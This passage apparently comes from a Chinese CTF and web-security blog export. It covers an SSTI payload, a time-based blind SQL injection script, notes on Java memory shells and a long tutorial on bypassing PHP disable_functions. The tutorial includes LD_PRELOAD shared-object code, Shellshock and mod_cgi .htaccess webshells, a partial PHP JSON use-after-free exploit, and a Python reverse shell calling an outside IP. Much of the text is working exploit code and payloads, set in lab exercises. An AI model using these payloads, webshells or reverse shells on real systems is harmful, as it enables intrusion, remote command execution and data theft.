\"\"\"扫描路由并检查状态码，找到第一个有效路由后停止\"\"\"    for index, route in enumerate(routes):        url = f\"{base_url}/{route}\"        try:            response = requests.get(url, timeout=timeout, verify=False)            if response.status_code == 200:                print(f\"[+] Found valid route: {url}\")                return url  # 找到第一个有效路由后返回            else:                print(f\"[-] Route not found: {url} (Status: {response.status_code})\")        except requests.exceptions.RequestException as e:            print(f\"[!] Error accessing {url}: {e}\")        except KeyboardInterrupt:            print(\"\\n[!] Scan interrupted by user.\")            return None        # 显示进度        if (index + 1) % 100 == 0:            print(f\"\\n[INFO] Scanned {index + 1}/{len(routes)} routes so far...\")        # 添加延迟以避免被封禁        time.sleep(delay)    return None  # 扫描完成但未找到有效路由def main():    # 警告信息    print(\"\\n\" + \"=\" * 50)    print(\"WARNING: This script should only be used on websites you own or have explicit permission to test.\")    print(\"Unauthorized scanning is illegal and unethical.\")    print(\"=\" * 50 + \"\\n\")    target_url = input(\"Enter the base URL (e.g., http://example.com): \")    confirm = input(\"\\nDo you confirm you have permission to scan this website? (yes/no): \")    if confirm.lower() != \"yes\":        print(\"Scan aborted.\")        return    # 生成路由组合    routes = generate_routes()    print(f\"\\nGenerated {len(routes)} routes to scan...\")    # 开始扫描    print(\"\\nStarting scan...\")    start_time = time.time()    valid_route = scan_routes(target_url, routes)    # 扫描完成    end_time = time.time()    print(f\"\\nScan completed in {end_time - start_time:.2f} seconds.\")    # 输出结果    if valid_route:        print(f\"\\n[+] Valid route found: {valid_route}\")    else:        print(\"\\n[-] No valid routes found.\")if __name__ == \"__main__\":    main()\n\n爆出来是aazz，来到aazz又告诉我可以传参，尝试了一些常见的参数名，发现是filename，尝试直接读取环境变量/proc/1/environ\n\n这是非预期解，我们来看看预期解\n通过filename直接读取app.py文件的源码\nimport os import string from flask import Flask, request, render_template_string, jsonify,send_from_directory from a.b.c.d.secret import secret_key\n\n可以知道secret在a.b.c.d.secret里面，是直面天命\n输入直面6*6天命发现：\n\n最终的payload：\n直面[][\"\\x5f\\x5fclass\\x5f\\x5f\"][\"\\x5f\\x5fmro\\x5f\\x5f\"][1] [\"\\x5f\\x5fsubclasses\\x5f\\x5f\"]()[351]('cat flag',shell=True,stdout=-1).communicate()[0].strip()天命\n\n模板注入的payload有很多的\n直面天命（复仇）和上一题样的，只不过由任意文件读取转变为源码展示，payload还是一样的\n","categories":["web"],"tags":["web"]},{"title":"内存马探知","url":"/2025/04/17/%E5%86%85%E5%AD%98%E9%A9%AC%E6%8E%A2%E7%9F%A5/","content":"内存马探知前言\n本文研究的是java的内存马，但是探索的过程是可以作为模板套用到挖掘其他组件上的漏洞的，后面会陆续挖掘python等语言的内存马，从我网上看了许多关于内存马的文章来说，java的内存马是很经典的\n初探内存马‘为了了解java的内存马，首先需要了解tomcat，来看看对于tomcat的总结\nTomcat 架构\n\nConnector 模块 ：是 Tomcat 与客户端通信的入口点。它接收客户端请求，并将其传递给容器进行处理。常见的 Connector 类型有 HTTP Connector（处理 HTTP 请求）和 AJP Connector（用于与 Apache HTTP Server 等 Web 服务器通信）。\nContainer 模块 ：负责处理请求和响应的业务逻辑。它包括多个子组件，如 Engine、Host 和 Context。Engine 是容器的顶层元素，Host 代表一个虚拟主机，Context 对应一个 Web 应用程序。\n\nTomcat 配置文件\n\nserver.xml ：这是 Tomcat 的主配置文件，定义了服务器的总体结构，包括 Connector、Container、Service 等组件的配置。例如，可以在这里配置 HTTP 端口、HTTPS 设置、虚拟主机等。\nweb.xml ：每个 Web 应用程序都有一个 web.xml 文件，用于定义应用程序的部署描述符。它包括诸如 Servlet 定义、Servlet 映射、过滤器配置等信息。\n\nTomcat 的组件（与内存马相关）\n\nClass Loader 组件 ：Tomcat 有自己独特的类加载器层次结构。它允许不同的 Web 应用程序加载自己的类，而不会相互干扰。这在一定程度上为内存马的隐藏和运行提供了可能。内存马可以利用类加载器的机制，在不修改磁盘文件的情况下，动态加载恶意类。\nServlet 容器组件 ：Servlet 是 Java Web 开发的核心组件。Tomcat 的 Servlet 容器负责加载、实例化和管理 Servlet。内存马可以伪装成正常的 Servlet，通过容器的生命周期方法（如 init()、service() 等）执行恶意代码。\n\nTomcat 的运行机制（与内存马相关）\n\n请求处理流程 ：当客户端发送请求到 Tomcat 时，Connector 接收请求，并将其解析为 HttpServletRequest 对象。然后，请求被传递给相应的 Context，根据 Servlet 映射找到对应的 Servlet，并调用其 service() 方法来处理请求。内存马可以在这个过程中拦截请求，篡改请求或响应内容，或者执行其他恶意操作。\n类加载和初始化 ：Tomcat 在启动过程中会加载和初始化各个组件，包括类加载器和 Servlet 容器。内存马可以在类加载器加载类或者 Servlet 容器初始化 Servlet 的阶段进行注入和激活。\n\n几个重要的组件Container和pipeline/valve","categories":["web"],"tags":["web"]},{"title":"记一次基于盲注的脚本编写","url":"/2025/04/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9F%BA%E4%BA%8E%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/","content":"sql盲注脚本本题是一个盲注题，可以基于布尔或者是时间，采取穷举法，时间复杂度上天了，效率不高，但是好歹爆出来了\n\n直接在前端进行注入的话没有回显，抓个包看看\n\n可以看到有延长了，说明是单引号闭合，并且在name处存在sql盲注\n这个时候就可以直接写脚本进行爆破了，贴上脚本，并且进行一一解释\n#导入必要的库import requestsimport timel = 'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{'#定义一个字符串，包含所有的数据，用于猜测数据url = \"http://2f326183-2993-42d8-8c8f-8635076e9a95.node5.buuoj.cn:81/login.php\"#目标urlsql1 = \"1' or if(substr((seLEct group_concat(table_name) from information_schema.tables  where table_schema=database()),%d,1)='%s',sleep(2),1)#\"#用来爆破库名的payload，使用两个占位符，后面在利用的时候会填入数据，下面的payload也是同理sql2 = \"1' or if(substr((seLEct group_concat(column_name) from information_schema.columns  where table_name='fl4g'),%d,1)='%s',sleep(2),1)#\"sql3 = \"1' or if(substr((seLEct group_concat(flag) from fl4g),%d,1)='%s',sleep(2),1)#\"flag = ''for num in range(1,100):#ascii值循环遍历    for i in l:#开始逐个猜取各个位置上的字符        data = {            'name' : sql3 % (num,i),使用占位符填入数据            'pass' : 'asdasd'        }#定义需要发送的数据以什么形式        t = int(time.time())#获取到发送payload时候的时间        r = requests.post(url = url , data = data , timeout = 5)#使用post方式传输数据        if int(time.time()) - t &gt; 2:#获取到接受响应的时候的时间，并且于发送payload的时间相减，获取响应时间，与两秒进行比较，如果大于两秒，说明猜取成功            flag += i#将猜取成功的数据拼接起来            print(\"flag:\",flag)            breakprint(\"flag:\",flag)#打印出所有的flag\n\n效果如下\n猜表名\n\n猜字段\n\n猜数据\n\n","categories":["web"],"tags":["web"]},{"title":"绕过disable_function的限制","url":"/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/","content":"绕过Disable_Function的限制前言\n当我们千辛万苦的上传一个shell文件之后，好不容易拿到webshell居然Tmd的无法执行系统命令\n\n多半是disable_function惹的祸，查看phpinfo确实设置了disable_function\n\n千辛万苦拿到的shell却变成了一个空壳，不甘心啊，所以就有了今天这一篇总结绕过disablefucntion的文章\n使用的环境都是在github上找到的，antsword-labs，使用docker-compose在本地搭建\n概念为了安全起见，很多运维人员会禁止使用php中的一些危险函数，例如eval，exec，system等，将其写在php.ini配置文件里面，为了彻底隔离同服务器的用户，以及避免出现大面积的安全问题，disable的设置也是非常严格\n如果在渗透的时候，上传了webshell却因为disable_function禁止了我们的函数而无法执行命令的话，这个时候就是想办法要绕过限制，tupodisable_dunction\n常规绕过(黑名单绕过)即便是通过disable functions限制危险函数，也可能会有限制不全的情况。如果运维人员安全意识不强或对PHP不甚了解的话，则很有可能忽略某些危险函数，常见的有以下几种。\n\nexec()\n\n&lt;?phpecho exec('whoami');?&gt;\n\n\nshell_exec()\n\n&lt;?phpecho shell_exec('whoami');?&gt;\n\n\nsystem()\n\n&lt;?phpsystem('whoami');?&gt;\n\n\npassthru()\n\n&lt;?phppassthru(\"whoami\");?&gt;\n\n\npopen()\n\n&lt;?php$command=$_POST['cmd'];$handle = popen($command,\"r\");while(!feof($handle)){            echo fread($handle, 1024);  //fread($handle, 1024);}  pclose($handle);?&gt;\n\n\nproc_open()\n\n&lt;?php$command=\"ipconfig\";$descriptorspec = array(1 =&gt; array(\"pipe\", \"w\"));$handle = proc_open($command ,$descriptorspec , $pipes);while(!feof($pipes[1])){         echo fread($pipes[1], 1024); //fgets($pipes[1],1024);}?&gt;\n\n还有一个比较常见的易被忽略的函数就是pcntl_exec。\n使用条件：\n\nPHP安装并启用了pcntl插件\n\npcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但如果运维人员安全意识不强或对PHP不甚了解，则很有可能忽略pcntl扩展的相关函数。\npcntl_exec()是pcntl插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。\n利用pcntl_exec()执行test.sh：\n&lt;?phpif(function_exists('pcntl_exec')) {   pcntl_exec(\"/bin/bash\", array(\"/tmp/test.sh\"));} else {       echo 'pcntl extension is not support!';}?&gt;\n\n由于pcntl_exec()执行命令是没有回显的，所以其常与python结合来反弹shell：\n&lt;?php pcntl_exec(\"/usr/bin/python\",array('-c','import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((\"132.232.75.90\",9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'));\n\n下面进入靶场，边打题边学习\n靶场具体关卡介绍\n\n绕过方法利用 LD_PRELOAD 环境变量原理简述\nLD_PRELOAD 是 Linux 和其他类 Unix 系统中的一个环境变量，它允许用户在程序启动时优先加载指定的共享库（shared libraries），覆盖默认的动态链接行为。通过这个机制，开发者可以替换或拦截程序调用的标准库函数，甚至修改程序的行为。\n核心作用\n\n覆盖函数实现当程序动态链接库函数时，LD_PRELOAD 指定的库会被最先加载，其中的函数会优先于系统标准库（如 libc.so）的同名函数被调用。例如，你可以自定义 malloc、free 或 open 等函数，替换原有的实现。\n动态注入代码无需修改程序源代码或重新编译，即可注入自定义代码。常用于调试、性能分析、修复兼容性问题等场景。\n\n我们可以通过环境变量LD_PRELOAD 劫持系统函数，可以达到不调用php的各种命令执行函数仍然可以执行系统命令的目的\n去github上下载yangyangwithgnu大佬的利用文件\n有下面这四个重要的文件\n\n\nbypass_disablefunc.php：一个用来执行命令的 webshell。\nbypass_disablefunc_x64.so或bypass_disablefunc_x86.so：执行命令的共享对象文件，分为64位的和32位的。\nbypass_disablefunc.c：用来编译生成上面的共享对象文件。\n\n对于bypass_disablefunc.php，权限上传到web目录的直接访问，无权限的话可以传到tmp目录后用include等函数来包含，并且需要用 GET 方法提供三个参数：\n\ncmd 参数：待执行的系统命令，如 id 命令。\n\noutpath 参数：保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点。\n\nsopath 参数：指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。\n来到第一关\n\n没什么过滤，直接连接蚁剑就行\n\n看到了flag，可惜里面啥都没有，估计是设置成只有root才能看‘\n我们尝试上传文件\n\n将这两个文件上传到目标靶机有权限的目录当中\n然后将bypass_disablefunc.php包含进来并使用GET方法提供所需的三个参数：\n/?ant=include(\"/var/tmp/bypass_disablefunc.php\");&amp;cmd=ls&amp;outpath=/tmp/outfile123&amp;sopath=/var/tmp/bypass_disablefunc_x64.so\n\n但是，居然打不进去，woc，按理说这个so文件应该是通杀的啊，\n我又找了个别的so文件，编写1.c文件如下\n#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__((constructor)) void ajest(){    unsetenv(\"LD_PRELOAD\");    if (getenv(\"CMD\") != NULL){        system(getenv(\"CMD\"));    }else{        system(\"echo 'no cmd' &gt; output\");    }}\n\n编译文件。\ngcc --share -fPIC hack.c -o hack.so\n\n将hack.so 文件上传到服务器，并且在服务器上编写文件cmd.php。\n&lt;?php    putenv(\"CMD=tac /flag &gt; output\");    putenv(\"LD_PRELOAD=./hack.so\");    error_log(\"a\",1);?&gt;\n\n直接通过Web 方式访问该php 文件。查看output 文件内容，即可得到flag。\n\n还有一个方法就是使用蚁剑自带的绕过disable_function的插件\n\n\n选择LD_PRELOAD模式并点击开始按钮，成功后蚁剑会在 /var/www/html 目录里上传一个 .antproxy.php 文件。我们创建副本, 并将连接的 URL shell 脚本名字改为 .antproxy.php获得一个新的shell，在这个新shell里面就可以成功执行命令了。要查看flag还是要使用suid提权的命令tac\n\n\n利用shellshock利用PHP破壳完成 Bypass\nBash远程代码执行漏洞(CVE-2014-6271)\n  漏洞原理：目前的Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。\n\n\n如图，环境还是一样的，但是方法变了，老样子，连接蚁剑，然后依旧无法执行命令，php.ini配置如下\ndisable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system\n\n首先可以使用antsword自带的绕过的方法\n\n\n然后直接进终端，查看flag就可以了\n\n首先AntSword 虚拟终端中已经集成了对 ShellShock 的利用, 直接在虚拟终端执行命令即可，\n注意1:\n注意看上图中 1 位置的进程树的情况\n如果执行命令直接使用 system 等执行命令的函数, 进程列表是这样的:\nwww-data   810   684  0 Jul06 ?        00:00:14 /usr/sbin/apache2 -k startwww-data   909   712  0 00:17 ?        00:00:00 sh -c /bin/sh -c \"cd \"/var/www/html\";ps -aef;echo [S];pwd;echo [E]\" 2&gt;&amp;1www-data   910   909  0 00:17 ?        00:00:00 /bin/sh -c cd /var/www/html;ps -aef;echo [S];pwd;echo [E]www-data   911   910  0 00:17 ?        00:00:00 ps -aef\n\n可以不明显的（bushi看出本例中执行命令时, 利用了 PHP error_log 函数在执行 sh -c  -t -i  时, Bash 的 ShellShock 漏洞, 从而实现了执行我们自定义命令的目的。/(ㄒoㄒ)/~~\n注意2:\n执行了 ls -al /tmp, 可以看到每次都生成了以 as 开头的临时文件, 这就是我们执行完命令之后, 将输出重定向到了临时文件中, 然后再读出来\n尝试文件管理直接用 PHP 读 flag, 肯定是读不到的\n\n我们就可以直接使用tac去终端里直接查看flag，tac有suid权限\n手动\n有如下几个脚本，挨个解释\n利用error_log函数\n通过查看phpinfo发现没有ban掉error_log\n然后上传脚本\nerror_log和mail两个函数，都可以使用，（为了避免ban掉一个）\n//默认putenv定义的环境变量名必须以PHP_开头。error_log()函数会在执行sh -c -t -i触发payload//sh -c -t -i:启动一个Bourne shell，让它执行一个命令字符串（这里没有提供具体的命令字符串），然后输出一个NULL字符并退出，同时保持交互式模式&lt;?php  @eval($_REQUEST['ant']);  putenv(\"PHP_test=() { :; }; tac /flag &gt;&gt; /var/www/html/test.php\");  error_log(\"admin\",1);  //mail(\"admin@localhost\",\"\",\"\",\"\",\"\");?&gt;\n\n去test.php下面就有flag了了\n\n然后是另外两个脚本\n首先是antsword官方提供的脚本\n&lt;?phpfunction runcmd($c){  $d = dirname($_SERVER[\"SCRIPT_FILENAME\"]);  if(substr($d, 0, 1) == \"/\" &amp;&amp; function_exists('putenv') &amp;&amp; (function_exists('error_log') || function_exists('mail'))){    if(strstr(readlink(\"/bin/sh\"), \"bash\")!=FALSE){      $tmp=tempnam(sys_get_temp_dir(), 'as');      putenv(\"PHP_LOL=() { x; }; $c &gt;$tmp 2&gt;&amp;1\");      if (function_exists('error_log')) {        error_log(\"a\", 1);      }else{        mail(\"a@127.0.0.1\", \"\", \"\", \"-bv\");      }    }else{      print(\"Not vuln (not bash)\\n\");    }    $output = @file_get_contents($tmp);    @unlink($tmp);    if($output!=\"\"){      print($output);    }else{      print(\"No output, or not vuln.\");    }  }else{    print(\"不满足使用条件\");  }}// runcmd(\"whoami\"); // 要执行的命令runcmd($_REQUEST[\"cmd\"]); // ?cmd=whoami?&gt;\n\n还是直接上传到antsword中，然后直接访问这个文件就可以了\n效果如下\n\n第三个脚本\n&lt;?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271 function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283    $tmp = tempnam(\".\",\"data\");    putenv(\"PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1\");    // In Safe Mode, the user may only alter environment variableswhose names    // begin with the prefixes supplied by this directive.    // By default, users will only be able to set environment variablesthat    // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty,    // PHP will let the user modify ANY environment variable!    mail(\"a@127.0.0.1\",\"\",\"\",\"\",\"-bv\"); // -bv so we don't actuallysend any mail   error_log('a',1);   $output = @file_get_contents($tmp);    @unlink($tmp);    if($output != \"\") return $output;    else return \"No output, or not vuln.\"; } echo shellshock($_REQUEST[\"cmd\"]); ?&gt;\n\n依旧是直接访问即可，效果如下\n\n注意，直接使用cat等命令还是无法查看，必须要使用类似于tac等能suid提权的命令\n利用 Apache Mod CGI具体走一遍流程吧，蚁剑连接，打开终端，执行命令，欸，执行不了欸~\n\n这里大概给个解释\nCGI：CGI简单说来便是放在服务器上的可执行程序,CGI编程没有特定的语言,C语言,linux shell,perl,vb等等都可以进行CGI编程.MOD_CGI：任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中.\n\n能用蚁剑连，但是/flag 这个文件是 644 权限，www-data （write-write-write)用户无法通过读文件的形式读到内容, 需要执行拥有 SUID 权限的 tac 命令(具体看 /start.sh)来获取 flag\n使用「绕过 disable_functions」插件, 选择 Apache_mod_cgi 模式进行使用条件必须是apache环境mod_cgi已经启用必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none必须有权限写.htaccess文件\n\n点击开始按钮之后会直接打开一个新的终端，能直接执行命令了\n\n手工\n其实原理就是利用.htaccess\nhtaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。这里的.htaccess文件，将所有.ant后缀的文件作为cgi脚本执行Options +ExecCGI #表示允许CGI执行，如果AllowOverride只有FileInfo权限且本身就开启了ExecCGI的话，就可以不需要这句话了AddHandler cgi-script .ant #告诉Apache将xx后缀名的文件当作CGI程序进行解析\n\n再写一个shell.ant文件\n#! /bin/shecho&amp;&amp;cd \"/var/www/html/backdoor\";tac /flag;\n\n\n然后直接访问shell.ant就可以直接执行命令了，改改htaccess文件，什么后缀都可以被当作chi程序解析，但是也是有使用条件的\n使用条件必须是apache环境mod_cgi已经启用必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none必须有权限写.htaccess文件\n\nPHP-FPM 利用 LD_PRELOAD正常情况下, PHP-FPM 是不会对外开放的。在有 webshell 之后，这就变得不一样了。学习通过攻击 PHP-FPM 达到 Bypass 的目的。\n\n前提知识：\nphp-fpm即php-Fastcgi Process Manager.php-fpm是 FastCGI 的实现，并提供了进程管理的功能。进程包含 master 进程和 worker 进程两种进程。master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个(具体数量根据实际需要配置)，每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方。\n\n总结来说php-fpm是一个fastcgi协议解析器，负责按照fastcgi的协议将TCP流解析成真正的数据\nPHP-FPM默认监听9000端口，我们可以自己构造fastcgi协议，和fpm进行通信。于是就有了利用 WebShell 直接与 PHP FastCGI (FPM) 来实现Bypass Disable Functions\n额，具体的流程还是那样，就不过多赘述了，我们直接使用antsword直接绕过吧\n连接蚁剑，使用插件模式选择Fastcgi/PHP-FPM\n注意该模式下需要选择 PHP-FPM 的接口地址, 需要自行找配置文件查 FPM 接口地址, 默认的是 unix:/// 本地 socket 这种的,如果配置成 TCP 的默认是 127.0.0.1:9000，一般默认都是9000端口\n\n直接连接这个php文件，密码还是ant\n\n本例中没有禁止 putenv, 可以用 LD_PRELOAD完成命令执行\n具体操作与 第一个相同, 不再缀述\n一些疑问和解答这里由于FPM默认监听的是9000端口,我们就可以绕过webserver,直接构造fastcgi协议，和fpm进行通信.于是就有了利用 webshell 直接与 FPM通信 来绕过 disable functions.因为前面我们了解了协议原理和内容,接下来就是使用cgi协议封装请求,通过socket来直接与FPM通信但是能够构造fastcgi，就能执行任意PHP代码吗?答案是肯定的,但是前提是我们需要突破几个限制：1.第一个问题既然是请求,那么SCRIPT_FILENAME就相当的重要,因为前面说过,fpm是根据这个值来执行php文件文件的,如果不存在,会直接返回404,所以想要利用好这个漏洞,就得找到一个已经存在的php文件,好在一般进行源安装php的时候,服务器都会附带上一些php文件,如果说我们没有收集到目标web目录的信息的话,可以试试这种办法.2.第二个问题我们再如何构造fastcgi和控制SCRIPT_FILENAME,都无法做到任意命令执行,因为只能执行目标服务器上的php文件.那要如何绕过这种限制呢? 我们可以从php.ini入手.它有两个特殊选项,能够让我们去做到任意命令执行,那就是auto_prepend_fileauto_prepend_file的功能是在在执行目标文件之前，先包含它指定的文件,这样的话,就可以用它来指定php://input进行远程文件包含了.这样就可以做到任意命令执行了.3.第三个问题进行过远程文件包含的小伙伴都知道,远程文件包含有allow_url_include这个限制因素的,如果没有为ON的话就没有办法进行远程文件包含,那要怎末设置呢?这里,FPM是有设置PHP配置项的KEY-VALUE的,PHP_VALUE可以用来设置php.ini,PHP_ADMIN_VALUE则可以设置所有选项.这样就解决问题了\n\n第五关还是和第四关一样，都是利用fastcgi攻击php-fpm\n不过多赘述\nJson Serizlizer UAF利用json序列化中的堆溢出触发，借此绕过限制，影响范围是:7.1 – all versions to date7.2 &lt; 7.2.19 (released: 30 May 2019)7.3 &lt; 7.3.6 (released: 30 May 2019)\n手工\n本人纯脚本小子，就直接用网上找到的脚本打了，exp地址：https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php\n&lt;?php# Author: https://github.com/mm0r1$cmd = $_POST[\"pass\"];$n_alloc = 10; # increase this value if you get segfaultsclass MySplFixedArray extends SplFixedArray {    public static $leak;}class Z implements JsonSerializable {    public function write(&amp;$str, $p, $v, $n = 8) {      $i = 0;      for($i = 0; $i &lt; $n; $i++) {        $str[$p + $i] = chr($v &amp; 0xff);        $v &gt;&gt;= 8;      }    }    public function str2ptr(&amp;$str, $p = 0, $s = 8) {        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) {            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        }        return $address;    }    public function ptr2str($ptr, $m = 8) {        $out = \"\";        for ($i=0; $i &lt; $m; $i++) {            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        }        return $out;    }    # unable to leak ro segments    public function leak1($addr) {        global $spl1;        $this-&gt;write($this-&gt;abc, 8, $addr - 0x10);        return strlen(get_class($spl1));    }    # the real deal    public function leak2($addr, $p = 0, $s = 8) {        global $spl1, $fake_tbl_off;        # fake reference zval        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x20, 6); # type (string)        $leak = strlen($spl1::$leak);        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }        return $leak;    }    public function parse_elf($base) {        $e_type = $this-&gt;leak2($base, 0x10, 2);        $e_phoff = $this-&gt;leak2($base, 0x20);        $e_phentsize = $this-&gt;leak2($base, 0x36, 2);        $e_phnum = $this-&gt;leak2($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) {            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = $this-&gt;leak2($header, 0, 4);            $p_flags = $this-&gt;leak2($header, 4, 4);            $p_vaddr = $this-&gt;leak2($header, 0x10);            $p_memsz = $this-&gt;leak2($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write                # handle pie                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec                $text_size = $p_memsz;            }        }        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    }    public function get_basic_funcs($base, $elf) {        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) {            $leak = $this-&gt;leak2($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {                $deref = $this-&gt;leak2($leak);                # 'constant' constant check                if($deref != 0x746e6174736e6f63)                    continue;            } else continue;            $leak = $this-&gt;leak2($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {                $deref = $this-&gt;leak2($leak);                # 'bin2hex' constant check                if($deref != 0x786568326e6962)                    continue;            } else continue;            return $data_addr + $i * 8;        }    }    public function get_binary_base($binary_leak) {        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) {            $addr = $start - 0x1000 * $i;            $leak = $this-&gt;leak2($addr, 0, 7);            if($leak == 0x10102464c457f) { # ELF header                return $addr;            }        }    }    public function get_system($basic_funcs) {        $addr = $basic_funcs;        do {            $f_entry = $this-&gt;leak2($addr);            $f_name = $this-&gt;leak2($f_entry, 0, 6);            if($f_name == 0x6d6574737973) { # system                return $this-&gt;leak2($addr + 8);            }            $addr += 0x20;        } while($f_entry != 0);        return false;    }    public function jsonSerialize() {        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;        $contiguous = [];        for($i = 0; $i &lt; $n_alloc; $i++)            $contiguous[] = new DateInterval('PT1S');        $room = [];        for($i = 0; $i &lt; $n_alloc; $i++)            $room[] = new Z();        $_protector = $this-&gt;ptr2str(0, 78);        $this-&gt;abc = $this-&gt;ptr2str(0, 79);        $p = new DateInterval('PT1S');        unset($y[0]);        unset($p);        $protector = \".$_protector\";        $x = new DateInterval('PT1S');        $x-&gt;d = 0x2000;        $x-&gt;h = 0xdeadbeef;        # $this-&gt;abc is now of size 0x2000        if($this-&gt;str2ptr($this-&gt;abc) != 0xdeadbeef) {            die('UAF failed.');        }        $spl1 = new MySplFixedArray();        $spl2 = new MySplFixedArray();        # some leaks        $class_entry = $this-&gt;str2ptr($this-&gt;abc, 0x120);        $handlers = $this-&gt;str2ptr($this-&gt;abc, 0x128);        $php_heap = $this-&gt;str2ptr($this-&gt;abc, 0x1a8);        $abc_addr = $php_heap - 0x218;        # create a fake class_entry        $fake_obj = $abc_addr;        $this-&gt;write($this-&gt;abc, 0, 2); # type        $this-&gt;write($this-&gt;abc, 0x120, $abc_addr); # fake class_entry        # copy some of class_entry definition        for($i = 0; $i &lt; 16; $i++) {            $this-&gt;write($this-&gt;abc, 0x10 + $i * 8,                 $this-&gt;leak1($class_entry + 0x10 + $i * 8));        }        # fake static members table        $fake_tbl_off = 0x70 * 4 - 16;        $this-&gt;write($this-&gt;abc, 0x30, $abc_addr + $fake_tbl_off);        $this-&gt;write($this-&gt;abc, 0x38, $abc_addr + $fake_tbl_off);        # fake zval_reference        $this-&gt;write($this-&gt;abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 8, 10); # zval type (reference)        # look for binary base        $binary_leak = $this-&gt;leak2($handlers + 0x10);        if(!($base = $this-&gt;get_binary_base($binary_leak))) {            die(\"Couldn't determine binary base address\");        }        # parse elf header        if(!($elf = $this-&gt;parse_elf($base))) {            die(\"Couldn't parse ELF\");        }        # get basic_functions address        if(!($basic_funcs = $this-&gt;get_basic_funcs($base, $elf))) {            die(\"Couldn't get basic_functions address\");        }        # find system entry        if(!($zif_system = $this-&gt;get_system($basic_funcs))) {            die(\"Couldn't get zif_system address\");        }        # copy hashtable offsetGet bucket        $fake_bkt_off = 0x70 * 5 - 16;        $function_data = $this-&gt;str2ptr($this-&gt;abc, 0x50);        for($i = 0; $i &lt; 4; $i++) {            $this-&gt;write($this-&gt;abc, $fake_bkt_off + $i * 8,                 $this-&gt;leak2($function_data + 0x40 * 4, $i * 8));        }        # create a fake bucket        